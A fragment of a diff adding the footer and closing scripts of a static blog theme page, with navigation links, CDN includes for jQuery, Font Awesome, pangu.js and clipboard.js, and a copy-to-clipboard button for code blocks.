+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- Add space -->
+<script src="https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+    // listen to any DOM change and automatically perform spacing via MutationObserver()
+    pangu.autoSpacingPage();
+  });
+</script>
+
+<!-- fancybox support -->
+
+       <script type="text/javascript" src="/js/fancybox/jquery.fancybox.min.js"></script>
+       <script type="text/javascript" src="/js/wrapImage.js"></script>
+   
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+</body>
+</html>
